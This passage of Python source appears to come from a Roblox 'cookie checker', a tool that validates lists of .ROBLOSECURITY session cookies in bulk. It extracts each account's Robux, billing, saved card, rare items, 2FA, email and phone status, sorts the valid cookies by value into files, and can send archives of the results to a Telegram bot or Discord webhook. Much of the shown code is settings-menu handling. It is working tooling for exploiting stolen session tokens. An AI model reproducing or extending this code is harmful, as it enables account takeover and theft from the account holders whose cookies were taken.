    order = ['Link', 'ID', 'Name', 'Display Name', 'Registration Date', 'Country Registration', 'Robux', 'Billing', 'Pending', 'Donate (1 Year)', 'Donate (All Time)', 'Rap', 'Card', 'Premium', 'Gamepasses', 'Custom Gamepasses', 'Badges', 'Favorite Places', 'Places Weekly Playtime', 'Bundles', 'Korblox', 'Headless', 'Inventory Privacy', 'Trade Privacy', 'Can Trade', 'Sessions', 'Email', 'Phone', '2FA', 'Pin', 'Groups Owned', 'Groups Members', 'Groups Pending', 'Groups Funds', 'Age Group', 'Verified Age', 'Verified Voice', 'Friends', 'Followers', 'Followings', 'Roblox Badges'] # 'Place Visits', 
    
    # Проверка куки
    async def checkCookieRoblox(cookie: str):
        async with semaphore:
            try:
                cookies = {'.ROBLOSECURITY': cookie}
                resultsRCC = await dataFromCookieRoblox(order, checkedAccounts, cookies, proxiesFromFile, outputModes)
                if type(resultsRCC) is str:
                    raise AccountDuplicate

                # Обработка данных
                allDataString = f'{' | '.join(value['no-color'] for value in resultsRCC.values())}{moveCookieNextLine}Cookie: {cookie}\n'

                # Сортировка
                if config['Roblox']['CookieChecker']['Sorting']['Sort']:
                    simpleSortValues = {
                        'ID'                        : resultsRCC.get('ID',                   {}).get('sort-str'),
                        'Name'                      : resultsRCC.get('Name',                 {}).get('sort-str'),
                        'Display_Name'              : resultsRCC.get('Display Name',         {}).get('sort-str'),
                        'Registration_Date_DMY'     : resultsRCC.get('Registration Date',    {}).get('sort-str'),
                        'Registration_Date_In_Days' : resultsRCC.get('Registration Date',    {}).get('sort-int'),
                        'Country_Registration'      : resultsRCC.get('Country Registration', {}).get('sort-str'),
                        'Robux'                     : resultsRCC.get('Robux',                {}).get('sort-int'),
                        'Billing'                   : resultsRCC.get('Billing',              {}).get('sort-int'),
                        'Pending'                   : resultsRCC.get('Pending',              {}).get('sort-int'),
                        'Donate_1_Year'             : resultsRCC.get('Donate (1 Year)' ,     {}).get('sort-int'),
                        'Donate_All_Time'           : resultsRCC.get('Donate (All Time)' ,   {}).get('sort-int'),
                        'Rap'                       : resultsRCC.get('Rap',                  {}).get('sort-int'),
                        'Card'                      : resultsRCC.get('Card',                 {}).get('sort-int'),
                        'Premium'                   : resultsRCC.get('Premium',              {}).get('sort-str'),
                        'Korblox'                   : resultsRCC.get('Korblox',              {}).get('sort-str'),
                        'Headless'                  : resultsRCC.get('Headless',             {}).get('sort-str'),
                        'Inventory_Privacy'         : resultsRCC.get('Inventory Privacy',    {}).get('sort-str'),
                        'Trade_Privacy'             : resultsRCC.get('Trade Privacy',        {}).get('sort-str'),
                        'Can_Trade'                 : resultsRCC.get('Can Trade',            {}).get('sort-str'),
                        'Sessions'                  : resultsRCC.get('Sessions',             {}).get('sort-int'),
                        'Email'                     : resultsRCC.get('Email',                {}).get('sort-str'),
                        'Phone'                     : resultsRCC.get('Phone',                {}).get('sort-str'),
                        '2FA'                       : resultsRCC.get('2FA',                  {}).get('sort-str'),
                        'Pin'                       : resultsRCC.get('Pin',                  {}).get('sort-str'),
                        'Groups_Members'            : resultsRCC.get('Groups Members',       {}).get('sort-int'),
                        'Groups_Pending'            : resultsRCC.get('Groups Pending',       {}).get('sort-int'),
                        'Groups_Funds'              : resultsRCC.get('Groups Funds',         {}).get('sort-int'),
                        'Place_Visits'              : resultsRCC.get('Place Visits',         {}).get('sort-int'),
                        'Age_Group'                 : resultsRCC.get('Age Group',            {}).get('sort-str'),
                        'Verified_Age'              : resultsRCC.get('Verified Age',         {}).get('sort-str'),
                        'Verified_Voice'            : resultsRCC.get('Verified Voice',       {}).get('sort-str'),
                    }

                    complexSortValues = {
                        'Gamepasses'             : [resultsRCC.get('Gamepasses',             {}).get('sort-int'), resultsRCC.get('Gamepasses',             {}).get('sort-dict')],
                        'Custom_Gamepasses'      : [resultsRCC.get('Custom Gamepasses',      {}).get('sort-int'), resultsRCC.get('Custom Gamepasses',      {}).get('sort-list')],
                        'Badges'                 : [resultsRCC.get('Badges',                 {}).get('sort-int'), resultsRCC.get('Badges',                 {}).get('sort-dict')],
                        'Favorite_Places'        : [resultsRCC.get('Favorite Places',        {}).get('sort-int'), resultsRCC.get('Favorite Places',        {}).get('sort-list')],
                        'Places_Weekly_Playtime' : [resultsRCC.get('Places Weekly Playtime', {}).get('sort-int'), resultsRCC.get('Places Weekly Playtime', {}).get('sort-list')],
                        'Bundles'                : [resultsRCC.get('Bundles',                {}).get('sort-int'), resultsRCC.get('Bundles',                {}).get('sort-dict')],
                        'Groups_Owned'           : [resultsRCC.get('Groups Owned',           {}).get('sort-int'), resultsRCC.get('Groups Owned',           {}).get('sort-list')],
                        'Roblox_Badges'          : [resultsRCC.get('Roblox Badges',          {}).get('sort-int'), resultsRCC.get('Roblox Badges',          {}).get('sort-list')]
                    }

                    await asyncio.gather(
                        *(sortingDataRoblox(sortLock, savePath / 'Sort' / categoriesNames[category], category, sortOptions, allDataString, value)              for category, value in simpleSortValues.items()  if value and sortOptions[category]['sort']),
                        *(sortingDataRoblox(sortLock, savePath / 'Sort' / categoriesNames[category], category, sortOptions, allDataString, value[0], value[1]) for category, value in complexSortValues.items() if value and sortOptions[category]['sort'])
                    )

                async with validLock:
                    counters['valid'] += 1
                    if isOutputTotal or isSendResultsToTelegramBot or isSendResultsToDiscordWebhook:
                        totalDataUpdate = {
                            'Robux'             : resultsRCC.get('Robux',             {}).get('sort-int'),
                            'Billing'           : resultsRCC.get('Billing',           {}).get('sort-int'),
                            'Pending'           : resultsRCC.get('Pending',           {}).get('sort-int'),
                            'Donate (1 Year)'   : resultsRCC.get('Donate (1 Year)' ,  {}).get('sort-int'),
                            'Donate (All Time)' : resultsRCC.get('Donate (All Time)', {}).get('sort-int'),
                            'Rap'               : resultsRCC.get('Rap',               {}).get('sort-int'),
                            'Card'              : resultsRCC.get('Card',              {}).get('sort-int'),
                            'Premium'           : resultsRCC.get('Premium',           {}).get('total'),
                            'Gamepasses'        : resultsRCC.get('Gamepasses',        {}).get('sort-int'),
                            'Custom Gamepasses' : resultsRCC.get('Custom Gamepasses', {}).get('sort-int'),
                            'Badges'            : resultsRCC.get('Badges',            {}).get('sort-int'),
                            'Favorite Places'   : resultsRCC.get('Favorite Places',   {}).get('sort-int'),
                            'Bundles'           : resultsRCC.get('Bundles',           {}).get('sort-int'),
                            'Groups Owned'      : resultsRCC.get('Groups Owned',      {}).get('sort-int'),
                            'Groups Members'    : resultsRCC.get('Groups Members',    {}).get('sort-int'),
                            'Groups Pending'    : resultsRCC.get('Groups Pending',    {}).get('sort-int'),
                            'Groups Funds'      : resultsRCC.get('Groups Funds',      {}).get('sort-int'),
                            'Place Visits'      : resultsRCC.get('Place Visits',      {}).get('sort-int'),
                            'Korblox'           : resultsRCC.get('Korblox',           {}).get('total'),
                            'Headless'          : resultsRCC.get('Headless',          {}).get('total')
                        }

                        for key, value in totalDataUpdate.items():
                            if type(value) is int:
                                totalDataCurrent[key] += value

                        for key in percentCategoriesList:
                            if totalDataCurrent[f'{key} %']:
                                if totalDataUpdate[key]:
                                    counters[key] += 1
                                totalDataCurrent[f'{key} %'] = f'{ANSI.FG.GRAY}| {counters[key]:>{amountOfCookiesFromFileStrLen}} | {f'{round(counters[key] / counters['valid'] * 100, 2)}%':<7}|'

                    async with aiofiles.open(savePath / filename, 'a', encoding='utf-8') as file:
                        await file.write(allDataString)
                    consoleOutputHandlerRCC(f'\r [{ANSI.FG.GREEN}>{ANSI.FG.WHITE}] {' | '.join(value['color'] for value in resultsRCC.values())}{f' | {ANSI.FG.CYAN}Cookie: {ANSI.FG.YELLOW}{cookie}' if config['Roblox']['CookieChecker']['Main']['Cookie_In_Console'] else ''}{ANSI.FG.WHITE}\n')
            except InvalidCookie:
                async with exceptLock:
                    counters['invalid'] += 1
                    async with aiofiles.open(savePath / 'invalid.txt', 'a', encoding='utf-8') as file:
                        await file.write(f'{cookie}\n')
                    consoleOutputHandlerRCC(f'\r [{ANSI.FG.RED}>{ANSI.FG.WHITE}] {ANSI.FG.RED}{MT_Invalid_Cookie}{ANSI.FG.WHITE}\n')
            except AccountBanned:
                async with exceptLock:
                    counters['banned'] += 1
                    async with aiofiles.open(savePath / 'banned.txt', 'a', encoding='utf-8') as file:
                        await file.write(f'{cookie}\n')
                    consoleOutputHandlerRCC(f'\r [{ANSI.CLEAR}{ANSI.FG.YELLOW}>{ANSI.FG.WHITE}{ANSI.DECOR.BOLD}]{ANSI.CLEAR} {ANSI.FG.YELLOW}{MT_Account_Banned}{ANSI.CLEAR}{ANSI.DECOR.BOLD}\n')
            except AccountDuplicate:
                async with exceptLock:
                    counters['duplicates'] += 1
                    async with aiofiles.open(savePath / 'duplicates.txt', 'a', encoding='utf-8') as file:
                        await file.write(f'ID: {resultsRCC} | Cookie: {cookie}\n')
                    consoleOutputHandlerRCC(f'\r [{ANSI.FG.YELLOW}>{ANSI.FG.WHITE}] {ANSI.FG.YELLOW}{MT_Account_Duplicate}{ANSI.FG.WHITE}\n')
            except Exception as e:
                logger.exception(f'< [ROBLOX_COOKIE_CHECKER] > {MT_Critical_Error}: {e}', force=True)

    savePath.mkdir(parents=True, exist_ok=True)
    cmdWriter(f'\r [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINEON}{file}{ANSI.DECOR.UNDERLINEOFF}\':\n')
    
    start = timer('start')
    await asyncio.gather(
        *(checkCookieRoblox(cookie) for cookie in checkReadyCookies)
    )
    stop = timer('stop', start=start)
    
    cmdWriter(f' [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Checking_Complete} {MT_In[1].lower()} {formatDuration(int(stop * 1000))}\n\n')
    playSystemSound()

    if isSendResultsToTelegramBot or isSendResultsToDiscordWebhook:
        messageText = (
            f'<b>💜 {MT_Roblox} {MT_Cookie_Checker.lower()}\n\n'
        
            f'🟢 {MT_Valid}: {counters['valid']}\n'
            f'🟡 {MT_Duplicates}: {counters['duplicates']}\n'
            f'🔴 {MT_Invalid}: {counters['invalid']}\n'
            f'🟠 {MT_Banned[1]}: {counters['banned']}\n\n'
            
            + '\n'.join(
                f'{e} {k}: {totalDataCurrent[k] if isinstance(totalDataCurrent[k], int) else 'Off'}'
                for e, k in [
                    ('💎', 'Robux'),
                    ('💵', 'Billing'),
                    ('⌛', 'Pending'),
                    ('💰', 'Donate (1 Year)'),
                    ('💰', 'Donate (All Time)'),
                    ('🚀', 'Rap'),
                    ('💳', 'Card'),
                    ('👑', 'Premium'),
                    ('🎫', 'Gamepasses'),
                    ('🎫', 'Custom Gamepasses'),
                    ('🏆', 'Badges'),
                    ('⭐', 'Favorite Places'),
                    ('📦', 'Bundles'),
                    ('🌐', 'Groups Owned'),
                    ('👯‍♀️', 'Groups Members'),
                    ('⌛', 'Groups Pending'),
                    ('💎', 'Groups Funds'),
                    ('🙋‍♂️', 'Place Visits')
                ]
            )
            + '</b>'
        )
        makeArchive(dateOfCheck, 'Roblox', 'Cookie Checker', 'outputs')
        _path = Path('Roblox', 'Cookie Checker', 'outputs', 'archives', f'{dateOfCheck}.zip')
        await sendMessageTelegramBot(messageText, _path)
        sendMessageDiscordWebhook(f'**{messageText.lstrip('<b>').rstrip('</b>')}**', _path)
        cmdWriter('\n')

    waitingInput()

def printGeneralRCC():
    length = len(str(len(cookieData.listOfCookieData))) + 12
    for index, data in enumerate(cookieData.listOfCookieData):
        category = data[0]
        message = f' ({WARNED_CATEGORIES_GENERAL_RCC[category]['color']}{WARNED_CATEGORIES_GENERAL_RCC[category]['message']}{ANSI.FG.WHITE})' if category in WARNED_CATEGORIES_GENERAL_RCC else ''
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Main'][data[1]])} {data[0]}{message}\n')

def generalCategoryRCC(printItems: bool = False, categoryName = '') -> list:
    noDuplicatedArrays = []
    noDuplicatedArrays = [item for item in config['Roblox']['CookieChecker']['Main'][f'{categoryName}_List']
                          if item and len(str(item[-2])) <= 100 and item not in noDuplicatedArrays]
    config['Roblox']['CookieChecker']['Main'][f'{categoryName}_List'] = noDuplicatedArrays
    autoSaveConfig()

    if printItems:
        length = len(str(len(noDuplicatedArrays))) + 12
        for index, item in enumerate(noDuplicatedArrays):
            cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(item[-1])} {rmEmojies(item[-2])}\n')
    return noDuplicatedArrays

def removeItemFromCategory(category: list, remove: str | int):
    for item in category:
        if remove in item:
            del category[category.index(item)]

def checkExist(bundleId: str, category: str) -> Optional[bool]:
    if str(bundleId).lower() in {str(id[1]).lower() if category == 'Custom_Gamepasses_List' else str(id[0]).lower() for id in config['Roblox']['CookieChecker']['Main'][f'{category}_List']}:
        return True

def printPlacesRCC():
    length = len(str(len(listOfPlaces))) + 12
    for index, place in enumerate(listOfPlaces):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Places'][place.placeNames[1]])} {place.placeNames[0]}\n')

# Функции для контекстного меню обычных плейсов
def removeLinesRCCPlaces(indexPlace: int) -> None:
    if (hasattr(listOfPlaces[indexPlace], 'Gamepasses') and hasattr(listOfPlaces[indexPlace], 'Badges')):
        removeLines(9)
    else:
        removeLines(8)

def printPlaceGamepasses(indexPlace: int) -> None:
    length = len(str(len(listOfPlaces[indexPlace].Gamepasses.listOfGamepasses))) + 12
    for index, gamepass in enumerate(listOfPlaces[indexPlace].Gamepasses.listOfGamepasses):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][gamepass[2]])} {gamepass[0]}\n')

def openPlaceGamepasses(indexPlace: int) -> None:
    removeLinesRCCPlaces(indexPlace)
    whileTrueStage5 = True
    while whileTrueStage5:
        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Places, listOfPlaces[indexPlace].placeNames[2], MT_Gamepasses)}\n\n')
        printPlaceGamepasses(indexPlace)
        cmdWriter(f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
        settingsRCCPlacesPlaceGamepassesTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
        match settingsRCCPlacesPlaceGamepassesTab:
            case settingsRCCPlacesPlaceGamepassesTab if settingsRCCPlacesPlaceGamepassesTab.startswith('0'):
                if len(settingsRCCPlacesPlaceGamepassesTab) == 1:
                    whileTrueStage5 = False
            case settingsRCCPlacesPlaceGamepassesTab if (settingsRCCPlacesPlaceGamepassesTab.isdigit() and int(settingsRCCPlacesPlaceGamepassesTab) <= len(listOfPlaces[indexPlace].Gamepasses.listOfGamepasses)):
                config['Roblox']['CookieChecker'][f'{listOfPlaces[indexPlace].__name__}'][listOfPlaces[indexPlace].Gamepasses.listOfGamepasses[int(settingsRCCPlacesPlaceGamepassesTab) - 1][2]] ^= True
                autoSaveConfig()
            case '+' | '=':
                for gamepass in listOfPlaces[indexPlace].Gamepasses.listOfGamepasses:
                    config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][gamepass[2]] = True
            case '-' | '_':
                for gamepass in listOfPlaces[indexPlace].Gamepasses.listOfGamepasses:
                    config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][gamepass[2]] = False
            case 'R' | 'К':
                loadConfig(configLoader['Loader']['Current_Config'])
        labelASCII()
        autoSaveConfigAndRemoveLinesInSettings(settingsRCCPlacesPlaceGamepassesTab, ('+', '=', '-', '_'), (), 0)

def printPlaceBadges(indexPlace: int) -> None:
    length = len(str(len(listOfPlaces[indexPlace].Badges.listOfBadges))) + 12
    for index, badge in enumerate(listOfPlaces[indexPlace].Badges.listOfBadges):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][badge[2]])} {badge[0]}\n')

def openPlaceBadges(indexPlace: int) -> None:
    removeLinesRCCPlaces(indexPlace)
    whileTrueStage5 = True
    while whileTrueStage5:
        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Places, listOfPlaces[indexPlace].placeNames[2], MT_Badges)}\n\n')
        printPlaceBadges(indexPlace)
        cmdWriter(f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
        settingsRCCPlacesPlaceBadgesTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
        match settingsRCCPlacesPlaceBadgesTab:
            case settingsRCCPlacesPlaceBadgesTab if settingsRCCPlacesPlaceBadgesTab.startswith('0'):
                if len(settingsRCCPlacesPlaceBadgesTab) == 1:
                    whileTrueStage5 = False
            case settingsRCCPlacesPlaceBadgesTab if (settingsRCCPlacesPlaceBadgesTab.isdigit() and int(settingsRCCPlacesPlaceBadgesTab) <= len(listOfPlaces[indexPlace].Badges.listOfBadges)):
                config['Roblox']['CookieChecker'][f'{listOfPlaces[indexPlace].__name__}'][listOfPlaces[indexPlace].Badges.listOfBadges[int(settingsRCCPlacesPlaceBadgesTab) - 1][2]] ^= True
                autoSaveConfig()
            case '+' | '=':
                for badge in listOfPlaces[indexPlace].Badges.listOfBadges:
                    config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][badge[2]] = True
            case '-' | '_':
                for badge in listOfPlaces[indexPlace].Badges.listOfBadges:
                    config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][badge[2]] = False
            case 'R' | 'К':
                loadConfig(configLoader['Loader']['Current_Config'])
        labelASCII()
        autoSaveConfigAndRemoveLinesInSettings(settingsRCCPlacesPlaceBadgesTab, ('+', '=', '-', '_'), (), 0)

def placeContextMenuRCC(indexPlace: int):
    labelASCII()
    whileTrueStage4 = True
    while whileTrueStage4:
        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Places, listOfPlaces[indexPlace].placeNames[2])}\n\n')

        hasGamepasses = hasattr(listOfPlaces[indexPlace], 'Gamepasses')
        hasBadges = hasattr(listOfPlaces[indexPlace], 'Badges')
        if hasGamepasses and hasBadges:
            cmdWriter(f' [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Gamepasses}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Badges}\n')
        elif hasGamepasses:
            cmdWriter(f' [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Gamepasses}\n')
        elif hasBadges:
            cmdWriter(f' [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Badges}\n')

        cmdWriter(f'  ┃\n [{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Places'][listOfPlaces[indexPlace].placeNames[1]])} {MT_Check}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
        settingsRCCPlacesPlaceTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
        match settingsRCCPlacesPlaceTab:
            case '1':
                if hasGamepasses:
                    openPlaceGamepasses(indexPlace)
                else:
                    openPlaceBadges(indexPlace)
            case '2':
                if hasBadges and hasGamepasses:
                    openPlaceBadges(indexPlace)
                else:
                    removeLinesRCCPlaces(indexPlace)
            case 'C' | 'С':
                config['Roblox']['CookieChecker']['Places'][listOfPlaces[indexPlace].placeNames[1]] ^= True
                autoSaveConfig()
                removeLinesRCCPlaces(indexPlace)
            case '0':
                whileTrueStage4 = False
                removeLinesRCCPlaces(indexPlace)
            case 'F' | 'А':
                labelASCII()
            case _:
                removeLinesRCCPlaces(indexPlace)

def printCustomPlacesRCC():
    listOfRCCCustomPlaces = list(config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'])
    if not listOfRCCCustomPlaces:
        return

    for index, customPlace in enumerate(listOfRCCCustomPlaces):
        length = len(str(len(listOfRCCCustomPlaces))) + 12
        if str(listOfRCCCustomPlaces[index]).isdigit() and (str(listOfRCCCustomPlaces[index]) in config['Roblox']['CookieChecker']['CustomPlaces'] and (f'{str(listOfRCCCustomPlaces[index])}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces'] or f'{str(listOfRCCCustomPlaces[index])}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces'])):
            cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][2])} {config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][1][0] if config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][1][0] != f'Unknown_{customPlace}' else config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][1][1] if config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][1][1] != f'Unknown_Default_{customPlace}' else f'Unknown_{customPlace}'} {f'({config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][0]})' if config['Roblox']['CookieChecker']['CustomPlaces']['Show_Game_ID_Next_To_The_Name'] else ''}\n')
        else:
            config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'].remove(customPlace)
    autoSaveConfig()

# Функции для контекстного меню кастомных плейсов
def removeLinesCustomPlaces(listOfRCCCustomPlaces: list, placeIndex: int) -> None:
    if f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces'] and f'{listOfRCCCustomPlaces[placeIndex]}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces']:
        removeLines(10)
    else:
        removeLines(9)

def printCustomPlaceGamepasses(listOfRCCCustomPlaces: list, placeIndex: int) -> None:
    length = len(str(len(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']))) + 12
    for index, gamepass in enumerate(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(gamepass[2])} {gamepass[1]}\n')

def openCustomPlaceGamepasses(listOfRCCCustomPlaces: list, placeIndex: int):
    removeLinesCustomPlaces(listOfRCCCustomPlaces, placeIndex)
    whileTrueStage6 = True
    while whileTrueStage6:
        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places, config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][2], MT_Gamepasses)}\n\n')
        printCustomPlaceGamepasses(listOfRCCCustomPlaces, placeIndex)
        cmdWriter(f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
        settingsRCCCustomPlacesPlaceGamepassesTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ')
        match settingsRCCCustomPlacesPlaceGamepassesTab:
            case settingsRCCCustomPlacesPlaceGamepassesTab if settingsRCCCustomPlacesPlaceGamepassesTab.startswith('0'):
                if len(settingsRCCCustomPlacesPlaceGamepassesTab) == 1:
                    whileTrueStage6 = False
            case settingsRCCCustomPlacesPlaceGamepassesTab if (settingsRCCCustomPlacesPlaceGamepassesTab.isdigit() and int(settingsRCCCustomPlacesPlaceGamepassesTab) <= len(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses'])):
                config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses'][int(settingsRCCCustomPlacesPlaceGamepassesTab) - 1][2] ^= True
                autoSaveConfig()
            case '+' | '=':
                for gamepass in config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']:
                    gamepass[2] = True
            case '-' | '_':
                for gamepass in config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']:
                    gamepass[2] = False
        labelASCII()
        autoSaveConfigAndRemoveLinesInSettings(settingsRCCCustomPlacesPlaceGamepassesTab, ('+', '=', '-', '_'), (), 0)

def printCustomPlaceBadges(listOfRCCCustomPlaces: list, placeIndex: int):
    length = len(str(len(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']))) + 12
    for index, badge in enumerate(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(badge[2])} {badge[1]}\n')

def openCustomPlaceBadges(listOfRCCCustomPlaces: list, placeIndex: int):
    removeLinesCustomPlaces(listOfRCCCustomPlaces, placeIndex)
    whileTrueStage6 = True
    while whileTrueStage6:
        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places, config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][2], MT_Badges)}\n\n')
        printCustomPlaceBadges(listOfRCCCustomPlaces, placeIndex)
        cmdWriter(f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
        settingsRCCCustomPlacesPlaceBadgesTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ')
        match settingsRCCCustomPlacesPlaceBadgesTab:
            case settingsRCCCustomPlacesPlaceBadgesTab if settingsRCCCustomPlacesPlaceBadgesTab.startswith('0'):
                if len(settingsRCCCustomPlacesPlaceBadgesTab) == 1:
                    whileTrueStage6 = False
            case settingsRCCCustomPlacesPlaceBadgesTab if (settingsRCCCustomPlacesPlaceBadgesTab.isdigit() and int(settingsRCCCustomPlacesPlaceBadgesTab) <= len(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges'])):
                config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges'][int(settingsRCCCustomPlacesPlaceBadgesTab) - 1][2] ^= True
                autoSaveConfig()
            case '+' | '=':
                for badge in config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']:
                    badge[2] = True
            case '-' | '_':
                for badge in config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']:
                    badge[2] = False
        labelASCII()
        autoSaveConfigAndRemoveLinesInSettings(settingsRCCCustomPlacesPlaceBadgesTab, ('+', '=', '-', '_'), (), 0)

def customPlaceContextMenuRCC(placeIndex: int):
    listOfRCCCustomPlaces = [str(customPlace) for customPlace in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']
                             if str(customPlace).isdigit() and str(customPlace) in config['Roblox']['CookieChecker']['CustomPlaces']]
    labelASCII()
    whileTrueStage5 = True
    while whileTrueStage5:
        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places, config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][2])}\n\n')
        
        if f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces'] and f'{listOfRCCCustomPlaces[placeIndex]}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces']:
            cmdWriter(f' [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Gamepasses}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Badges}\n')
        elif f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces']:
            cmdWriter(f' [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Gamepasses}\n')
        elif f'{listOfRCCCustomPlaces[placeIndex]}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces']:
            cmdWriter(f' [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Badges}\n')

